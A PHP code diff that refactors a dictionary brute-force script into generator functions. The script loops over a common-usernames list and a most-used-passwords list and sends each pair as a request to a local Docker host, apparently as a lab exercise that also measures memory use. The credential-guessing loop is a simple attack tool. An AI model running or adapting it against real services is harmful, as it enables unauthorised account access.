@@ -6,13 +6,24 @@ require_once __DIR__ . '/../vendor/autoload.php';
 
 $client = new Guzzle(['base_uri' => 'http://host.docker.internal:80']);
 
-$usernames = fopen('top-usernames-shortlist.txt', 'r');
-while(!feof($usernames)) {
-    $username = fgets($usernames);
+function getUsernames($file) {
+    $handle = fopen($file, 'r');
+    while (!feof($handle)) {
+        yield fgets($handle);
+    }
+    fclose($handle);
+}
 
-    $passwords = fopen('2020-200_most_used_passwords.txt', 'r');
-    while(!feof($passwords)) {
-        $password = fgets($passwords);
+function getPasswords($file) {
+    $handle = fopen($file, 'r');
+    while (!feof($handle)) {
+        yield fgets($handle);
+    }
+    fclose($handle);
+}
+
+foreach (getUsernames('top-usernames-shortlist.txt') as $username) {
+    foreach (getPasswords('2020-200_most_used_passwords.txt') as $password) {
         echo 'DEBUG => username: ' . $username . ' - password: ' . $password;
         $response = $client->request('GET', '/', [
             'username' => $username,
@@ -20,9 +31,7 @@ while(!feof($usernames)) {
         ]);
         echo "status: {$response->getStatusCode()} <br>";
     }
-    fclose($passwords);
 }
-fclose($usernames);
 
 $memory_used = memory_get_usage();
 $memory_used_mb = round($memory_used / (1024 * 1024), 2);
